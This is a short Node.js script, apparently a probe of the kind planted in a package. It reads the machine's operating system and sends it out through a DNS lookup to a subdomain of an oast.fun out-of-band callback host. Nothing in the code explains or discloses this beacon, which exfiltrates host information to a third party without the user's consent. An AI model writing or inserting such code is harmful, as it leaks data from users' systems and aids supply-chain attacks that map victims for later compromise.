const dns = require('dns');
const os = require('os');


const platform = os.platform();
let queryData = '';

switch (platform) {
    case 'aix': queryData = 'aix'
        break;
    case 'android': queryData = 'android'
        break;
    case 'darwin': queryData = 'darwin'
        break;
    case 'freebsd': queryData = 'freebsd'
        break;
    case 'linux': queryData = 'linux'
        break;
    case 'openbsd': queryData = 'openbsd'
        break;
    case 'sunos': queryData = 'sunos'
        break;
    case 'win32': queryData = 'windows'
        break;
    default: queryData = 'bilinmeyen'
}

const domain = `${queryData}.nkhgevpndozoxokzqhojhvfqppdrh4xzm.oast.fun`;

dns.resolve(domain, (err, records) => {
  if (err) {
    console.error('DNS sorgulama hatası:', err);
    return;
  }
});
